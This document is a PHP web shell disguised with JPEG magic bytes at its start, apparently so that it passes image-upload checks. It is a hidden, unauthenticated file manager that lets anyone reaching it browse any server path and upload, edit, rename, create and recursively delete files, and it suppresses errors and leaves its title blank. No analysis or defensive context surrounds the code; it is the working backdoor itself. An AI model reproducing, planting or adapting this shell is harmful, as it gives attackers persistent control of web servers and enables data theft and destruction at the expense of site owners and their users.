ÿØÿà
<?php
/* =====  ===== */
error_reporting(0);
set_time_limit(0);

ini_set('memory_limit','256M');
ini_set('upload_max_filesize','128M');
ini_set('post_max_size','128M');
ini_set('max_execution_time','300');
ini_set('max_input_time','300');

ini_set('opcache.enable', 0);
ini_set('opcache.enable_cli', 0);
ini_set('opcache.revalidate_freq', 0);
ini_set('output_buffering', 'Off');
ini_set('zlib.output_compression', 0);

header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");

/* === LITESPEED FIX === */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST) && empty($_FILES)) {
    clearstatcache(true);
}

/* === PATH === */
$path = realpath($_GET['path'] ?? getcwd());
if (!$path) $path = getcwd();
chdir($path);
function h($s){ return htmlspecialchars($s,ENT_QUOTES); }

/* === DELETE === */
if(isset($_GET['del'])){
    $x=$_GET['del'];
    if(is_dir($x)){
        function rr($d){
            foreach(scandir($d) as $i){
                if($i!='.'&&$i!='..'){
                    is_dir("$d/$i")?rr("$d/$i"):@unlink("$d/$i");
                }
            } @rmdir($d);
        } rr($x);
    } else @unlink($x);
    clearstatcache(true);
    header("Location:?path=$path"); exit;
}

/* === RENAME === */
if(isset($_POST['rename'])){
    if($_POST['old'] && $_POST['new']){
        @rename($_POST['old'], $_POST['new']);
        clearstatcache(true);
    }
}

/* === EDIT === */
if(isset($_POST['save'])){
    file_put_contents($_POST['file'], $_POST['content'], LOCK_EX);
    clearstatcache(true);
}

/* === CREATE === */
if(isset($_POST['newfile'])) file_put_contents($_POST['fname'],'');
if(isset($_POST['newfolder'])) mkdir($_POST['dname'],0755);

/* === UPLOAD FIX === */
$msg='';
if(isset($_FILES['up'])){
    $n = basename($_FILES['up']['name']);
    $t = $_FILES['up']['tmp_name'];

    if(is_uploaded_file($t)){
        if(move_uploaded_file($t,$n)){
            chmod($n,0644);
            clearstatcache(true);
            $msg="✅ Upload OK";
        } else {
            $msg="❌ Upload Failed";
        }
    }
}
?>
<!doctype html>
<html>
<head>
<title></title>
<style>
body{background:#050b14;color:#4fc3ff;font-family:monospace}
a{color:#00bfff;text-decoration:none}
input,textarea,button{background:#071a2c;color:#4fc3ff;border:1px solid #00bfff}
table{width:100%}
.small{font-size:12px;color:#7ad7ff}
hr{border:1px solid #0b3d66}
</style>
</head>
<body>

<h2>/h2>
<div class="small">📂 Path: <?=h($path)?></div>
<b><?=$msg?></b>

<hr>

<form method="post" enctype="multipart/form-data">
<input type="file" name="up">
<button>Upload</button>
</form>

<form method="post">
<input name="fname" placeholder="newfile.txt">
<button name="newfile">Create File</button>
</form>

<form method="post">
<input name="dname" placeholder="newfolder">
<button name="newfolder">Create Folder</button>
</form>

<hr>

<table border="1" cellpadding="5">
<tr><th>Name</th><th>Size</th><th>Action</th></tr>

<?php
if($path!='/'){
 echo "<tr><td><a href='?path=".dirname($path)."'>[..]</a></td><td></td><td></td></tr>";
}
foreach(scandir($path) as $f){
 if($f=='.'||$f=='..')continue;
 echo "<tr>
 <td>".(is_dir($f)?"📁 <a href='?path=$path/$f'>$f</a>":"📄 $f")."</td>
 <td>".(is_file($f)?filesize($f):'-')."</td>
 <td>
 <a href='?path=$path&del=$f'>Delete</a> |
 <a href='?path=$path&rename=$f'>Rename</a>".
 (is_file($f)?" | <a href='?path=$path&edit=$f'>Edit</a>":"").
 "</td></tr>";
}
?>
</table>

<?php if(isset($_GET['edit'])): ?>
<hr>
<form method="post">
<input type="hidden" name="file" value="<?=h($_GET['edit'])?>">
<textarea name="content" rows="20"><?=h(file_get_contents($_GET['edit']))?></textarea><br>
<button name="save">Save</button>
</form>
<?php endif; ?>

<?php if(isset($_GET['rename'])): ?>
<hr>
<form method="post">
<input type="hidden" name="old" value="<?=h($_GET['rename'])?>">
<input name="new" placeholder="new_name.ext">
<button name="rename">Rename</button>
</form>
<?php endif; ?>

</body>
</html>